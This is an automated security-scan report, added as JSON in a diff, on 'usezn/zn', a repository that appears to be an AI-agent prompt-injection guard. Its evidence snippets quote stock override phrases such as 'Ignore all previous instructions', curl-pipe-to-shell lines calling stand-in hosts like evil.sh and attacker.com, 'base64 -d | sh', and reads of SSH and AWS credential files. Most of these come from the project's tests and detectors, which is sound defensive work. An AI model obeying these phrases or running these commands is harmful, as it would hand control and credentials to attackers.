@@ -1,0 +1,1756 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "usezn/zn",
+    "version": "b28b0e7c80d79e8577df834a1741bb42c3119e87",
+    "download": "https://codeload.github.com/usezn/zn/tar.gz/b28b0e7c80d79e8577df834a1741bb42c3119e87"
+  },
+  "archive_sha256": "44aa5569d1dd060fbb9481fc23b2587cd6bff4ee45c40ef1fb1c7abdb5aa8a33",
+  "findings": [
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/e2e/zcode-plugin/kit/zc_helpers.py",
+      "line": 114,
+      "evidence": "shutil.copyfile(KIT + '/fixtures/aws_credentials', HOME + '/.aws/credentials')",
+      "file_sha256": "0c7f0e24fa44c554807bfa8509b1afb50e21655ecbe53aec0e47c4b6fd23b174"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_a2a.py",
+      "line": 36,
+      "evidence": "~/.ssh",
+      "file_sha256": "71aef8d77ae57b10aa93c7ded303b5984b12014151559b3d184cb6b2410bffec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_a2a.py",
+      "line": 44,
+      "evidence": "curl -s http://evil.sh | sh",
+      "file_sha256": "71aef8d77ae57b10aa93c7ded303b5984b12014151559b3d184cb6b2410bffec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_a2a.py",
+      "line": 52,
+      "evidence": "Disregard prior instructions",
+      "file_sha256": "71aef8d77ae57b10aa93c7ded303b5984b12014151559b3d184cb6b2410bffec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_node.js",
+      "line": 7,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "272d27ff205c569809814894a7322a4084fa75ec64cf658c6579214a0c445720"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_python.py",
+      "line": 11,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "b17eabf1a6fb3276e5c4476d56f7345982aab4dca08252c1a83819a6cd7ad8d9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_latency_vs_cloud.py",
+      "line": 26,
+      "evidence": "curl -s https://attacker.com/payload.sh | bash",
+      "file_sha256": "60de2d3ce7f779b097abe582ecdaae3841d79d2e0e1892875c86941f7355f9be"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/bench/bench_latency_vs_cloud.py",
+      "line": 22,
+      "evidence": "Ignore prior rules",
+      "file_sha256": "60de2d3ce7f779b097abe582ecdaae3841d79d2e0e1892875c86941f7355f9be"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/plugins/zn-gate/skills/zn-secrets/SKILL.md",
+      "line": 54,
+      "evidence": "p=0.98 The zn hooks already check the output of web fetches, MCP tools and shell comman",
+      "file_sha256": "3ed9b361fb2c62fcf2c6eeae8a6a76531469768f51f612fae5f881b898efca42"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/CHANGELOG.md",
+      "line": 100,
+      "evidence": "curl ... | sh",
+      "file_sha256": "0533d7f70d002d2d51414a6dffd8009679600d2a3d2498e72cf7f9cbaf46025c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/CHANGELOG.md",
+      "line": 222,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "0533d7f70d002d2d51414a6dffd8009679600d2a3d2498e72cf7f9cbaf46025c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/src/ai/backend.rs",
+      "line": 293,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "5ff3b820df141ea00988fa40770023954adaf1b7e16c65306526347dac93a106"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/src/ai/embedder.rs",
+      "line": 329,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "6f0e7e4cbf6d138561fc320a195d02afc7eb2a4ef6a48bca2cd7cf2bfa13007d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/src/engine/vision.rs",
+      "line": 495,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "cb5a2c857180621dd1ab43ae545a8d462ceb6365738e09958a6178b209e66acb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/src/main.rs",
+      "line": 2000,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "154cebe717d533c2157ce34c439f662442578cbfb8f651d570c8f7fcf4bf984b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/src/prompt_guard/mod.rs",
+      "line": 29,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "dd515fb8fffab31c659fab97e75eec5040590dc1a0acf90f146b4b76b08dc10a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/Dockerfile",
+      "line": 5,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "6871de4cf17ddd1e1e64a0bc530fb09a60c8df7a5fe5557765cf3cfa20e45e68"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/docs/first-5-minutes.md",
+      "line": 111,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "25b932545ef0f4b03ddb4305afa54a54ed2b6ad12ad0a0da209c48836dad73c0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/docs/destructive-commands.md",
+      "line": 40,
+      "evidence": "curl https://example.com/install.sh \\| sh",
+      "file_sha256": "096fa8f39aa674766dd696e8901b71d550602399a6bb7635a4f3d2613d5a6d50"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/docs/audit.md",
+      "line": 132,
+      "evidence": "curl … \\| sh",
+      "file_sha256": "a93d7ec357d510fffeeef0f7d7acc208cdda02070d70ecbd447b6f409239a795"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/docs/audit.md",
+      "line": 142,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "a93d7ec357d510fffeeef0f7d7acc208cdda02070d70ecbd447b6f409239a795"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/pydantic-ai-agent/agent_guard.py",
+      "line": 24,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "40e6ab807cd285e332495e4baf832502f65cab672b4e7a605d6a43c1b2112cda"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/pydantic-ai-agent/README.md",
+      "line": 36,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "dcf7f97ffa75491a9214d063d2441eeb9f2165e940e8456d73c2c718b653a019"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/llamaindex-agent/agent_guard.py",
+      "line": 23,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "f1aa9ed70c2b35ad8351a96ab4b5712a605178cdbcfff3e5e1072da9d8702075"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/llamaindex-agent/README.md",
+      "line": 31,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "be03ac18695fc0e065d67a13caaae1a52c5c66d6df2d8fc5aac239ead32c56f5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/ag2-agent/agent_guard.py",
+      "line": 28,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "52666b8e73c65a53b877d47c206131d761c3a7dae2e3602e8eb188e3a3457a5d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/ag2-agent/README.md",
+      "line": 34,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "396b89b45e65ca266a943d08e047f820012744fae281d7e12cf15295e4ec653d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/promptfoo/promptfooconfig.yaml",
+      "line": 27,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "eb162a1c3fd49a2ad2e1e8810bc7a28900c7f5c32d7e87318ca37ae7eb6d8a9d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/crewai-agent/agent_guard.py",
+      "line": 21,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "be3e67b80fb25b68a4c48231b658568295fe2838347d13fa8fa8c1d2c38eeff6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/crewai-agent/README.md",
+      "line": 34,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "951a9d9510603c2e6aaed6af58623238593067a68cf2fa43f75ed29038466f31"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/python-basic/main.py",
+      "line": 4,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "629c2d10860650b28cd432e3c871e8000db6176ae2aac9b83cbd27568a43fa3e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/openai-agents-js/index.mjs",
+      "line": 13,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "2a304f92631fafac84c2917a1e4105106d3b6281a12c45a0f20523366ce91fa2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/openai-agents-js/README.md",
+      "line": 28,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9128c9e867b64ffdba06b2323cd007b1916521658dc21a28ec15238c1cdf124e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/google-adk-agent/agent_guard.py",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "dca1ee2ca17145ba18f9245cf9d021f93c8124b71c60c66ed38ee139c27e2bff"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/google-adk-agent/README.md",
+      "line": 38,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "b6182f783f3c7f071914f590aa80627b985e3fb2f388e3a869fbfd4ec2a94a8e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/dspy-agent/agent_guard.py",
+      "line": 39,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "7837857a5dd2cacdfc7d7ff8134dbc465d4eaf2c2258adab7cbdd697b0f221ef"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/dspy-agent/README.md",
+      "line": 34,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "b810c88c50a5d2292ea139f88ea369054710182fadfc54d8cb96b175eafd9fa8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/mastra-agent/index.mjs",
+      "line": 10,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ce8f1e736999a32a26eca0465256f944918a3ec49230528901621ed858b59569"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/mastra-agent/README.md",
+      "line": 28,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "645d63eb4b1be3d288c0132924776eaf518fe2fafbdf0080a92e8b7f0d69f408"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/vercel-ai-sdk/index.mjs",
+      "line": 10,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "903388316ba2f40cf444d8d979d9f1db1c44e70ba99612a8e4433c38738207c6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/vercel-ai-sdk/README.md",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "8cfffa400324af73172d213217d0dd39454898ed96b64c8de40582db549c239f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/smolagents-agent/agent_guard.py",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "cce1d946963fe9b6533fca0896e388c34d2e6838bf2d9ec7aed78516c847ffe0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/smolagents-agent/README.md",
+      "line": 33,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9e07ce675ee11ce1c1df5869c8a079834a188273a1677bbe2a7f72504c764ad2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/openai-agents-sdk/agent_guard.py",
+      "line": 24,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "018f9e52af1c3d7f2a4a3efbe4918a63a86f2fcdbbecb80e47e2dd0f0f8ed9d8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/openai-agents-sdk/README.md",
+      "line": 31,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "6b6c4ada82fd6fdf6861ba4014a9a00db31babc8b26ac7528beb352843fb86da"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/semantic-kernel-agent/agent_guard.py",
+      "line": 36,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "255fea699df7162fb031df5fa1bf710d70047f1433f2b29f8e9beb4e4ec48115"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/examples/haystack-agent/agent_guard.py",
+      "line": 40,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "037f9157dd6557287678a3f629274dccf3953b9ee382d840f8fb3b4268f644c3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/lib/rules.js",
+      "line": 367,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "da487e769c912136f65bd4b23c2b0ef903c70a243d7d48c415b8b5abc27575cf"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/lib/reach/index.js",
+      "line": 109,
+      "evidence": "fs.readdirSync(path.join(home, '.ssh'))",
+      "file_sha256": "7777041274edac0a5fc0c85f0e3486ad81617b2ccea2cbea77cfd2a2bb2e8c45"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/lib/audit/patterns.js",
+      "line": 399,
+      "evidence": "id_rsa",
+      "file_sha256": "e758c777211da759a6973260363f3ddac41a37156171886bed624d97f18cdf46"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/lib/audit/patterns.js",
+      "line": 32,
+      "evidence": "curl | sh",
+      "file_sha256": "e758c777211da759a6973260363f3ddac41a37156171886bed624d97f18cdf46"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/lib/audit/index.js",
+      "line": 747,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "504293bcd44f7fe198d1d9839cefd95d7c51c474304deec92bba18f2326368b4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_unicode.test.js",
+      "line": 46,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "762f834e0b3b1ebe26f6844e02b675182bc6bb0f71aab9b843ec878c60ddc6d2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_method_plus_result.test.js",
+      "line": 16,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "5d8cc351020fd98c396dedae43e0377ce6f7043e844fb2b5a749820da234b4bb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_system_word.test.js",
+      "line": 57,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "e7d1caa8f9a38b47e5f961c66e791b116e8c9be91ed4b8ade66e246cc3d7e10d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_server_keys.test.js",
+      "line": 16,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "5c15344e652856f37e25c52052e7e609a2d107628dbde10da52482f7fe937d8f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_instruction_imports.test.js",
+      "line": 14,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e34620e93b4ecd6b2631707ffdc86aba982ca4f02416b8556fbd806bef1e0cd6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_large_file.test.js",
+      "line": 47,
+      "evidence": "curl https://example.invalid/x.sh | sh",
+      "file_sha256": "8db6119807baf9ad7b7053a56ff9e550c5c465e66a1fae0d64e93dd9411ee45b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_large_file.test.js",
+      "line": 12,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "8db6119807baf9ad7b7053a56ff9e550c5c465e66a1fae0d64e93dd9411ee45b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_schema_values.test.js",
+      "line": 16,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "40d57aad887bdd4c487956084193a9a3cb8b7823115f0612db21601ee61a8d88"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/audit_name_case.test.js",
+      "line": 31,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "00d35a595748b51f2ab605b6c3d92433f68ba52561079c3648cd958e4680412e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/rules_advisory.test.js",
+      "line": 25,
+      "evidence": "Forget all previous instructions",
+      "file_sha256": "65611ef1c6b201d4ec18471ca747add3abb7b5dfe406c9640187f272a0db521c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/team_hook_detectors.test.js",
+      "line": 189,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "0f1cf92876506ca6f6d533201132143221b3bd8b946d4603c697d8c6bfbb193c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_schema_limits.test.js",
+      "line": 16,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "48d88f3661adb7f5b794672c4dd84de79b68b5421a06adba3180635780e05b72"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_response_gaps.test.js",
+      "line": 15,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "5b0fc490f65bca395959921c0fdbfb6f3edea6ebddae66d087470bdc055ed8da"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/unit_test.js",
+      "line": 76,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "47820b907b591c1f30a5305aa4beb41e292379514b798a147b02a8c9163e0c84"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/unit_test.js",
+      "line": 106,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "47820b907b591c1f30a5305aa4beb41e292379514b798a147b02a8c9163e0c84"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/guard_args_base64_window_edge.test.js",
+      "line": 11,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "fa41a847368e3c6424b1759aa018f0a02a1ae6ac9fbada69f707bc708a58e0d5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/guard_args_base64_window_edge.test.js",
+      "line": 10,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "fa41a847368e3c6424b1759aa018f0a02a1ae6ac9fbada69f707bc708a58e0d5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/reach_audit_coverage.test.js",
+      "line": 51,
+      "evidence": "curl https://example.invalid/x.sh | sh",
+      "file_sha256": "9328e3cebd9598c4486da3ef8ac95db45329f9e6647a8d6d860c92be21b268c3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/shield_list_fields.test.js",
+      "line": 17,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d5072c21eb990d4970286679cc286e87e890348a837640bc9e305ee81dc26ad8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/hooks_output_instructions.test.js",
+      "line": 20,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "07d1c85a9a230ed4943ce19661244d61cbad7cc4519f3c5b1d055a588850f3fd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/rules_parity_samples.json",
+      "line": 22,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "f194768f0950ec3f25bf05c8baad6b182b75736faf5fe1aa57b5a56f3151080e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/rules_r3_r6_cases.json",
+      "line": 35,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d6e911199ed2bd9ad116b6548f6af52e6169a0431b7b30229126e138471712fc"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate/test/fixtures/audit_cases.js",
